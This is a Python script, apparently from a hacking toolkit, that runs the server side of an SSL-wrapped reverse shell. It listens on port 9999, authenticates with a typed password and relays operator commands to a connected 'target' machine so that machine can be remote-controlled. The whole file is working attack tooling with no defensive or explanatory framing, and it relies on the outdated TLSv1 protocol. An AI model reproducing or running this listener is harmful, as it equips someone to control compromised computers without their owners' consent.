#!/usr/bin/env python3
"""
PySslShells - Reverse Shell Server
Author: Darkerego <xelectron@protonmail.com>
"""
import ssl
import socket
from sys import exit
from time import sleep

# ip address of server, can use own computer's private IP if doing on local

host = '127.0.0.1'
port = int(9999)
pw = 'lol'
debug = True


def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        # don't use common ports like 80, 3389

        s = socket.socket()  # actual conversation between server and client
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set is so that when we cancel out we can reuse port.
    except socket.error as msg:
        print("Error creating socket: " + str(msg))
    else:
        s = ssl.wrap_socket(s, certfile='../ssl/server.crt', keyfile='../ssl/server.key',
                            ssl_version=ssl.PROTOCOL_TLSv1)


# binds socket to port and wait for connection from client/target
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        try:
            s.bind((host, port))
        except OSError:
            print('Address already in use. Quitting.')
            exit(1)
        s.listen(5)
    except socket.error as msg:
        print("Error binding socket to port: " + str(msg) + "\n" + "Retrying in ten seconds...")
        sleep(10)
        socket_bind()


# establish connection with client (socket must be listening for connections)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# sends commands to target/client computer to remote-control it
def send_commands(conn):
    authenticated = False
    if not authenticated:
        pw = input('Password: ')
        conn.send(str.encode(pw))
        response = str(conn.recv(1024), "utf-8")
        if response != 'Invalid password\n':
            print(response, end='')
        else:
            print('ERROR authenticating: %s ' % response)
            conn.close()
            exit(1)
    while True:  # infinite loop for connection to stay constant
        try:
            cmd = input()  # cmd = command we type into terminal to send to client
        except KeyboardInterrupt:
            print('\nCaught Signal, exiting ...\n')
            conn.close()
            exit(1)
        else:
            if cmd == '__quit__':
                conn.send(str.encode(cmd))
                conn.close()
                exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(4096), "utf-8")
                print(client_response, end="")  #


def main():

    create_socket()
    socket_bind()
    socket_accept()


main()
